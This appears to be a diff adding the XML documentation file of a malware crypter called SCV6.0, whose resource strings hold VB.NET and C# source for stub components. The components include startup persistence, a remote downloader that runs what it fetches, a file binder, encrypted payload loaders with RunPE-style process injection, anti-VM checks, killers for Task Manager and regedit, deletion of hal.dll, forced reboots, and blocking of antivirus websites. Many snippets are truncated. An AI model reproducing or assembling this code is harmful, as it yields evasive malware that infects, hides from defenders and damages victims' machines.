@@ -1,0 +1,604 @@
+﻿<?xml version="1.0"?>
+<doc>
+<assembly>
+<name>
+SCV6.0
+</name>
+</assembly>
+<members>
+<member name="P:SCV6._0.My.Resources.Resources.ResourceManager">
+	<summary>
+  Returns the cached ResourceManager instance used by this class.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Culture">
+	<summary>
+  Overrides the current thread's CurrentUICulture property for all
+  resource lookups using this strongly typed resource class.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Add2StartUp">
+	<summary>
+  Looks up a localized string similar to Shared Sub PushStart()
+        Dim xx As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup) &amp; "\" &amp; IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
+        While True
+            Try
+                If Not IO.File.Exists(xx) Then
+                    IO.File.Copy(System.Windows.Forms.Application.ExecutablePath, xx)
+                End If
+            Catch
+            End Try
+            System.Threading.Thread.Sleep(5000)
+        End While
+End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Adxdiag">
+	<summary>
+  Looks up a localized string similar to  Shared Sub F63()
+        Killer("dxdiag")
+ End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.AESLoader">
+	<summary>
+  Looks up a localized string similar to  Dim N As String = System.Text.Encoding.Default.GetString(AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM")))))
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, AD(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I")))), False)
+ Catch
+ End Try
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object() {AD(System.Text.Encoding.Default.GetByt [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.AESRev">
+	<summary>
+  Looks up a localized string similar to Shared Function AD(ByVal Y As Byte())
+        Using A As New System.Security.Cryptography.RC2CryptoServiceProvider
+            A.IV = New Byte() {Convert.ToInt32(1000, 2), Convert.ToInt32(111, 2), _
+                               Convert.ToInt32(110, 2), Convert.ToInt32(101, 2), _
+                               Convert.ToInt32(100, 2), Convert.ToInt32(11, 2), _
+                               Convert.ToInt32(10, 2), Convert.ToInt32(&amp;H1, 2)}
+            A.Key = New Byte() {Convert.ToInt32(&amp;H0, 2), Conve [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.ANotePad">
+	<summary>
+  Looks up a localized string similar to  Shared Sub F62()
+        Killer("notepad")
+ End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.AntisSub">
+	<summary>
+  Looks up a localized string similar to Shared Sub AT
+		Dim id As String = "76487-337-8429955-22614"
+		
+        Dim regPID As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows NT\CurrentVersion", False)
+        
+        Dim pid As Object = regPID.GetValue("ProductId")
+        
+        Dim D As Object, R As String = Nothing, B As String = "SELECT * FROM Win32_VideoController"
+        
+        D = GetObject("winmgmts:").ExecQuery(B)
+        
+        Dim AdaptList As Object
+        [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.APIs">
+	<summary>
+  Looks up a localized string similar to Public Declare Function SetWindowLong Lib "user32.dll" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nindex As Long, ByVal dwnewlong As Long) As Long
+|Public Declare Function CallWindowProc Lib "user32.dll" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
+|Public Declare Function DefWindowProc Lib "user32.dll" Alias "DefWindowProcA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Binder">
+	<summary>
+  Looks up a localized string similar to Dim filled() As String
+
+Dim rand As New Random()
+
+'FilledSplitting
+
+Dim tpth As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; "\" &amp; rand.Next(10000, 99999).ToString &amp; filled(1)
+
+My.Computer.FileSystem.WriteAllBytes(tpth, System.Text.Encoding.Default.GetBytes(filled(0)), False)
+
+System.Diagnostics.Process.Start(tpth)
+
+.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Downloader">
+	<summary>
+  Looks up a localized string similar to Dim Expl As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; "\1" &amp; IO.Path.GetFileName(System.Windows.Forms.Application.ExecutablePath)
+My.Computer.Network.DownloadFile($DownloadLink$, Expl)
+Do Until IO.File.Exists(Expl) = True
+   System.Threading.Thread.Sleep(1000)
+Loop
+System.Diagnostics.Process.Start(Expl).
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.FolderOpt">
+	<summary>
+  Looks up a localized string similar to Try
+  Dim regloc As String = "HKEY_CURRENT_USER\Software\Microsoft\Windows\Current Version\Policies\Explorer"
+  My.Computer.Registry.SetValue(regloc, "NoFolderOptions", "1", Microsoft.Win32.RegistryValueKind.DWord)
+Catch
+End Try.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.FunctionA">
+	<summary>
+  Looks up a localized string similar to Public Shared Sub A(ByVal ProcessName As String)
+        Dim proc As System.Diagnostics.Process() = System.Diagnostics.Process.GetProcesses     
+        If System.Diagnostics.Process.GetProcessesByName(ProcessName).Length &gt;= 1 Then        
+            System.Threading.Thread.Sleep(10000)            
+        End If
+End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.HalDLL">
+	<summary>
+  Looks up a localized string similar to Try
+   IO.File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.System) &amp; "\hal.dll")
+Catch
+End Try.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Invoke">
+	<summary>
+  Looks up a localized string similar to     Public Shared Function RInvoke(ByVal bytes As Byte()) As Boolean
+        Dim vr1 As New Threading.Thread(AddressOf vr0)
+        vr1.SetApartmentState(Threading.ApartmentState.STA)
+        vr1.Start(bytes)
+    End Function
+    Private Shared Sub vr0(ByVal vr0 As Object)
+        Dim vr19 As Reflection.MethodInfo = Reflection.Assembly.Load(DirectCast(vr0, Byte())).EntryPoint
+        If vr19.GetParameters.Length = 1 Then
+            vr19.Invoke(Nothing, New Object() {New String() {}})
+        Else
+ [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.KFunction">
+	<summary>
+  Looks up a localized string similar to Public Shared Function Killer(ByVal proc As String) As String
+        Try
+            While True
+                Dim p As System.Diagnostics.Process
+                For Each p In System.Diagnostics.Process.GetProcesses
+                    If proc.Contains(p.ProcessName) Then
+                        p.Kill()
+                    End If
+                Next
+                System.Threading.Thread.Sleep(1)
+            End While
+        Catch ex As Exception
+        End Try
+        Return Nothing
+  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Killers">
+	<summary>
+  Looks up a localized string similar to 	Shared Sub KKK
+	
+		Dim KF13 As New System.Threading.Thread(AddressOf F13)
+		
+        KF13.Start()
+        
+        Dim KF14 As New System.Threading.Thread(AddressOf F14)
+        
+        KF14.Start()
+        
+        Dim KF15 As New System.Threading.Thread(AddressOf F15)
+        
+        KF15.Start()
+        
+        Dim KF16 As New System.Threading.Thread(AddressOf F16)
+        
+        KF16.Start()
+        
+        Dim KF17 As New System.Threading.Thread(AddressOf F17)
+        
+       [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Melt">
+	<summary>
+  Looks up a localized string similar to 'Shared Sub Melt(ByVal NewName As String)
+ ' Try
+  '  Dim NewFolder As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+   ' If Application.StartupPath = NewFolder = False Then
+   ' FileCopy(System.Windows.Forms.Application.ExecutablePath, NewFolder &amp; "\" &amp; NewName)
+   ' Shell(NewFolder &amp; "\" &amp; NewName &amp; " " &amp; Application.ExecutablePath)
+   ' Dim Hidden As System.IO.FileAttributes = FileAttributes.Hidden
+   ' IO.File.SetAttributes(NewFolder &amp; "\" &amp; NewName, Hidden)
+   '  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.msconfig">
+	<summary>
+  Looks up a localized string similar to  Shared Sub F61()
+        Killer("msconfig")
+ End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyDec">
+	<summary>
+  Looks up a localized string similar to Public Shared Function PolyDec(ByVal Input As String) As String
+        Dim Output As String = Nothing
+        Dim SA() As String
+        SA = Input.Split("|")
+        For Each C As String In SA
+            Try
+                Output = Output &amp; Chr(C - SA(0))
+            Catch
+            End Try
+        Next
+        Return Output.Remove(0, 1)
+End Function.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyRC4Loader">
+	<summary>
+  Looks up a localized string similar to  Dim D As New PolyRC4(R.GetObject("K"))
+ Dim N As String = D.Decrypt(R.GetObject("NM"))
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim B As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject("I")))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, B, False)
+ Catch
+ End Try
+ Dim C As Byte() = System.Text.Encoding.Default.GetBytes(D.Decrypt(R.GetObject("F")))
+ LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X")) [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyRC4Rev">
+	<summary>
+  Looks up a localized string similar to Public Class PolyRC4
+
+        Private Key As String = "sad87x6zucigedsjfguycxtiu4e75689374-w24098sdfhj-324iuysdjfbhsdjf"
+
+        Sub New(ByVal EncryptionKey As String)
+
+            Key = EncryptionKey
+
+        End Sub
+
+        Public Function Encrypt(ByVal message As String) As String
+
+            message = XX(message, Key)
+
+            Dim random As New Random()
+
+            Dim list1 As New System.Collections.ArrayList(), list2 As New System.Collections.ArrayList()
+
+            Dim out  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyStairsLoader">
+	<summary>
+  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM"))), _
+R.GetObject("K")))
+Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+If IO.File.Exists(I) Then
+    IO.File.Delete(I)
+End If
+Try
+    My.Computer.FileSystem.WriteAllBytes(I, PolyMorphicStairs.PolyDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I"))), (R.GetObject("K"))), False)
+Catch
+End Try
+LoadMethod("IX", " [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyStairsRev">
+	<summary>
+  Looks up a localized string similar to Public Class PolyMorphicStairs
+        Overloads Shared Function PolyDeCrypt(ByVal Data As String, ByVal Key As String, Optional ByVal ExtraRounds As UInteger = 0) As String
+            Dim buff() As Byte = PolyDeCrypt(Encoding.Default.GetBytes(Data), Encoding.Default.GetBytes(Key), ExtraRounds)
+            PolyDeCrypt = Encoding.Default.GetString(buff)
+            Erase buff
+        End Function
+        Overloads Shared Function PolyDeCrypt(ByRef Data() As Byte, ByVal Key() As Byte, Optional ByVal Ex [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyXORLoader">
+	<summary>
+  Looks up a localized string similar to  Dim D As New Polymorphic(R.GetObject("K"))
+ Dim N As String = System.Text.Encoding.Default.GetString(D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM")))))
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, D.PolyDeCrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I")))), False)
+ Catch
+ End Try
+ LoadMethod("IX", "R", CC(ReverseString(R.Get [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.PolyXORRev">
+	<summary>
+  Looks up a localized string similar to Public Class PolyMorphic
+        'Variable for the Key.
+        Private sKey As String = ""
+        'Property, will Give us acces to the key.
+        Public Property Key() As String
+            Get
+                Return sKey
+            End Get
+            Set(ByVal value As String)
+                sKey = value
+            End Set
+        End Property
+        'Inisalization. (New Constructor)
+        Public Sub New(ByVal Key As String)
+            Me.Key = Key
+        End Sub
+        Public [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.RC4">
+	<summary>
+  Looks up a localized string similar to Public Shared Function Rc4(ByVal ºjmÍ() As Byte, ByVal ºjmUÍ() As Byte) As Byte()
+
+        Dim s(Convert.ToInt32(11111111, &amp;H2)) As Byte
+
+        Dim i As Integer
+
+        For i = Convert.ToInt32(&amp;H0, &amp;H2) To s.Length - Convert.ToInt32(&amp;H1, &amp;H2)
+
+            s(i) = CByte(i)
+
+        Next
+
+        Dim j As Integer
+
+        For i = Convert.ToInt32(&amp;H0, &amp;H2) To s.Length - Convert.ToInt32(&amp;H1, &amp;H2)
+
+            j = (j + ºjmUÍ(i Mod ºjmUÍ.Length) + s(i)) And Convert.ToInt32(11111111, &amp;H2)
+
+     [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.RC4Loader">
+	<summary>
+  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(Rc4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM"))), _
+R.GetObject("K")))
+Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+If IO.File.Exists(I) Then
+    IO.File.Delete(I)
+End If
+Try
+    My.Computer.FileSystem.WriteAllBytes(I, Rc4(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I"))), (R.GetObject("K"))), False)
+Catch
+End Try
+LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), New Object( [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Regedit">
+	<summary>
+  Looks up a localized string similar to Shared Sub F60()
+        Killer("regedit")
+End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.ResetStub">
+	<summary>
+  Looks up a localized string similar to Option Explicit Off
+Option Strict Off
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Text
+Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Windows.Forms
+Imports System.IO
+Imports System.CodeDom.Compiler
+'AssemblyCodes
+Public Class Out
+	'FakeAPI#1
+    'FakeAPI#2
+    'FakeAPI#3
+    'FakeAPI#4
+    'FakeAPI#5
+    'FakeAPI#6
+    'FakeAPI#7
+    'FakeAPI#8
+    'FakeAPI#9
+    'FakeAPI#A
+  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Restart">
+	<summary>
+  Looks up a localized string similar to Dim bytloc As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) &amp; "\restart"
+If Not IO.File.Exists(bytloc) Then
+   Dim filebyt As Byte() = New Byte() {}
+   My.Computer.FileSystem.WriteAllBytes(bytloc, filebyt, False)
+   Microsoft.VisualBasic.Shell("shutdown -r -t" &amp; " 00", Microsoft.VisualBasic.AppWinStyle.Hide)
+End If.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.RijLoader">
+	<summary>
+  Looks up a localized string similar to  Dim N As String = RijndaelDecrypt(R.GetObject("NM"),R.GetObject("K"))
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim II As Byte() = System.Text.Encoding.Default.GetBytes(RijndaelDecrypt(R.GetObject("I"), _
+ R.GetObject("K")))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, II, False)
+ Catch
+ End Try
+ Dim III As Byte() = System.Text.Encoding.Default.GetBytes(RijndaelDecrypt(R.GetObject("F"), _
+ R.GetObject("K")))
+ LoadMethod("IX [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.RijndaelRev">
+	<summary>
+  Looks up a localized string similar to Public Shared Function RijndaelDecrypt(ByVal Decrypt As String, ByVal Key As String)
+
+        Dim A As New RijndaelManaged
+
+        Dim BC() As Byte
+
+        Dim BS() As Byte = New Byte() {Convert.ToInt32(&amp;H1, &amp;H2), _
+                                           Convert.ToInt32(10, &amp;H2), _
+                                           Convert.ToInt32(11, &amp;H2), _
+                                           Convert.ToInt32(100, &amp;H2), _
+                                           Convert.ToInt32(101, &amp;H2),  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.RpE">
+	<summary>
+  Looks up a localized string similar to using System.Runtime.InteropServices;
+using System;
+using System.Text;
+public class IX
+{
+    [return: MarshalAs(UnmanagedType.Bool)]
+    [DllImport("kernel32")]
+    private static extern bool CreateProcess(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
+    [return: MarshalAs(UnmanagedType.Bool)]
+    [DllImport("kernel32")]
+    private static extern bool [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.StairsLoader">
+	<summary>
+  Looks up a localized string similar to Dim N As String = System.Text.Encoding.Default.GetString(SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("NM"))), _
+R.GetObject("K")))
+Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+If IO.File.Exists(I) Then
+    IO.File.Delete(I)
+End If
+Try
+    My.Computer.FileSystem.WriteAllBytes(I, SDecrypt(System.Text.Encoding.Default.GetBytes(ReverseString(R.GetObject("I"))), (R.GetObject("K"))), False)
+Catch
+End Try
+LoadMethod("IX", "R", CC(ReverseString(R.GetObject("X"))), N [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.StairsRev">
+	<summary>
+  Looks up a localized string similar to Public Shared Function SDeCrypt(ByVal Data() As Byte, ByVal key() As Byte) As Byte()
+            For i = Data.Length - Convert.ToInt32(&amp;H1, 2) To Convert.ToInt32(0, 2) Step -1
+                Data(i) = CByte((CInt(Data(i) Xor key(i Mod key.Length)) - CInt(Data((i + _
+                Convert.ToInt32(&amp;H1, 2)) Mod Data.Length)) + Convert.ToInt32(100000000, 2)) _
+                Mod Convert.ToInt32(100000000, 2))
+            Next
+            Return Data
+        End Function.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Stub">
+	<summary>
+  Looks up a localized string similar to Option Explicit Off
+Option Strict Off
+Imports System.Reflection
+Imports System.Runtime.InteropServices
+Imports System
+Imports Microsoft.VisualBasic
+Imports System.Text
+Imports System.Security.Cryptography
+Imports Microsoft.Win32
+Imports System.Windows.Forms
+Imports System.IO
+Imports System.CodeDom.Compiler
+'AssemblyCodes
+Public Class Out
+	'FakeAPI#1
+    'FakeAPI#2
+    'FakeAPI#3
+    'FakeAPI#4
+    'FakeAPI#5
+    'FakeAPI#6
+    'FakeAPI#7
+    'FakeAPI#8
+    'FakeAPI#9
+    'FakeAPI#A
+  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.TaskMSub">
+	<summary>
+  Looks up a localized string similar to Shared Sub F59()
+     Killer("taskmgr")
+End Sub.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.TDESLoader">
+	<summary>
+  Looks up a localized string similar to  Dim N As String = TripleDESdecrypt(R.GetObject("NM"),R.GetObject("K"), True)
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim II As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject("I"), _
+ R.GetObject("K"), True))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, II, False)
+ Catch
+ End Try
+ Dim III As Byte() = System.Text.Encoding.Default.GetBytes(TripleDESdecrypt(R.GetObject("F"), _
+ R.GetObject("K"), Tr [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.TDESRev">
+	<summary>
+  Looks up a localized string similar to Public Shared Function TripleDESdecrypt(ByVal b As String, ByVal c As String, ByVal d As Boolean) As String
+        Dim keyArray As Byte()
+        Dim toEncryptArray As Byte() = Convert.FromBase64String(b)
+        If d Then
+            Dim hashmd5 = New MD5CryptoServiceProvider()
+            keyArray = hashmd5.ComputeHash(UTF8Encoding.UTF8.GetBytes(c))
+        Else
+            keyArray = UTF8Encoding.UTF8.GetBytes(c)
+        End If
+        Dim tdes = New TripleDESCryptoServiceProvider()
+        td [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.Websites">
+	<summary>
+  Looks up a localized string similar to Shared Sub W
+
+            WebBlock("www.novirusthanks.org")
+
+            WebBlock("www.virustotal.com")
+  
+            WebBlock("www.virusscan.jotti.org")
+
+            WebBlock("www.malwarebytes.org")
+  
+            WebBlock("www.bitdefender.com/scanner/online/free.html")
+    
+            WebBlock("www.eset.com/online-scanner")
+
+            WebBlock("housecall.trendmicro.com")
+  
+            WebBlock("www.kaspersky.com/scanforvirus")
+            
+            WebBlock("www.kaspersky.com/vir [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.XORLoader">
+	<summary>
+  Looks up a localized string similar to  Dim N As String = xEncryptionD(R.GetObject("K"), R.GetObject("NM"))
+ Dim I As String = Environ("APPDATA") &amp; "\" &amp; N &amp; ".exe"
+ If IO.File.Exists(I) Then
+	IO.File.Delete(I)
+ End If
+ Dim II As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject("K"), _
+ R.GetObject("I")))
+ Try
+	My.Computer.FileSystem.WriteAllBytes(I, II, False)
+ Catch
+ End Try
+ Dim III As Byte() = System.Text.Encoding.Default.GetBytes(xEncryptionD(R.GetObject("K"), _
+ R.GetObject("F")))
+ LoadMethod("IX", "R",  [rest of string was truncated]";.
+</summary>
+</member><member name="P:SCV6._0.My.Resources.Resources.XORRev">
+	<summary>
+  Looks up a localized string similar to Public Shared Function xEncryptionD(ByVal CodeKey As String, ByVal DataIn As String) As String
+
+        Dim lonDataPtr As Long
+
+        Dim strDataOut As String = ""
+
+        Dim intXOrValue1 As Integer
+
+        Dim intXOrValue2 As Integer
+
+        Dim H As String = "&amp;H"
+
+        For lonDataPtr = 1 To (Len(DataIn) / 2)
+
+            intXOrValue1 = Val(H &amp; (Mid$(DataIn, (2 * lonDataPtr) - 1, 2)))
+
+            intXOrValue2 = Asc(Mid$(CodeKey, ((lonDataPtr Mod Len(CodeKey)) + 1), 1))
+
+         [rest of string was truncated]";.
+</summary>
+</member><member name="T:SCV6._0.My.Resources.Resources">
+	<summary>
+  A strongly-typed resource class, for looking up localized strings, etc.
+</summary>
+</member>
+</members>
+</doc>
